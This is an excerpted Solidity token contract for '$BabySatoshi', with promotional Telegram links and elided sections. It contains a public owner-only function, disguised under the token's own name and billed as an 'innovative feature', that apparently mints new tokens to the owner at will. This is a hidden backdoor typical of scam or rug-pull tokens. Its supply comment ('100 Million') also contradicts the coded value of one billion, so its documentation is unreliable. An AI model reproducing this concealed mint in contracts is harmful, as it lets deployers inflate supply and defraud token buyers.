//
// $BabySatoshi proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabySatoshitoken
//  📱 Website::https://
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabySatoshi(uint256 amount) public onlyOwner {
 _BabySatoshi(msg.sender, amount);
    }
    ...
    function _BabySatoshi(address account, uint256 amount) internal virtual {
...
contract $BabySatoshi is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Satoshi", "SATOSHI") {
     _BabySatoshi(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}